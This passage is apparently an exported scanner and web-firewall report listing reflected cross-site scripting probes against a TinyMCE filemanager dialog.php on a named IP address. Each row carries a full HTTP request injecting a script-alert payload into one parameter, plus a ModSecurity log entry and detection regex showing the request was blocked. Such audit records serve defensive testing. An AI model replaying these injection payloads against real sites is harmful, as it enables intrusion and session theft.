&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(315899)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=b0mk5lejc9v3i5hbhgd3hppa63
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:25</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:23 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(315899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttG6wQAW0AAHgzv0wAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttG6wQAW0AAHgzv0wAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366920</td><td class=xl24 width=64 >2015-03-31 22:33:20</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id='&gt;&lt;script&gt;alert(481799)&lt;/script&gt;&lt;!--&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=5abila8pmofua8r6kin8jqdvk5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:26</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:25 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(481799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttHawQAW0AAB7zKNkAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttHawQAW0AAB7zKNkAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366921</td><td class=xl24 width=64 >2015-03-31 22:34:48</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type='&gt;&lt;script&gt;alert(685599)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=rni027kiiueq433m8lqs0e15t3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:27</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:26 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(685599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttHqwQAW0AAHhGMuIAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttHqwQAW0AAHhGMuIAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366922</td><td class=xl24 width=64 >2015-03-31 22:36:33</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup='&gt;&lt;script&gt;alert(646299)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=a87ju0juts9itnfr3kkuipkuo6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:28</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:27 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(646299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttH6wQAW0AAHzDqsgAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttH6wQAW0AAHzDqsgAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366923</td><td class=xl24 width=64 >2015-03-31 22:39:58</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang='&gt;&lt;script&gt;alert(160999)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=nc9a0047890s4lsf786fp5j0u1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:30</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:29 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(160999)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttIawQAW0AAHewA9gAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttIawQAW0AAHewA9gAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366924</td><td class=xl24 width=64 >2015-03-31 22:41:43</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain='&gt;&lt;script&gt;alert(816799)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=406fg22gahdjs55kk58kq9io31
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:31</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:30 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(816799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttIqwQAW0AABvT@HQAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttIqwQAW0AABvT@HQAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366925</td><td class=xl24 width=64 >2015-03-31 22:43:27</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(684999)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=j0v0gq5j928ir6krvo4hlc9n41
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:32</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:31 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(684999)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttI6wQAW0AAHhB77wAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttI6wQAW0AAHhB77wAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366926</td><td class=xl24 width=64 >2015-03-31 22:44:01</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type='&gt;&lt;script&gt;alert(874099)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=ccl3gl1ln9dvals4jfo8p0jg04
Connection: Close

